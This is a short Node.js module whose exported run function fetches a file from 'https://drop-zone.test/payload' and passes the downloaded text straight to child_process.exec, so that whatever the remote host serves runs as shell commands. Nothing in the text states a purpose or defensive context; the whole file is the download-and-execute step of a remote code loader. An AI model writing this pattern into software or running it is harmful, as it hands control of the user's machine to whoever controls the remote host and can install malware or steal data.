const https = require("https");
const child_process = require("child_process");

exports.run = function () {
  https.request("https://drop-zone.test/payload", (response) => {
    let source = "";
    response.on("data", (chunk) => { source += chunk; });
    response.on("end", () => child_process.exec(source));
  }).end();
};
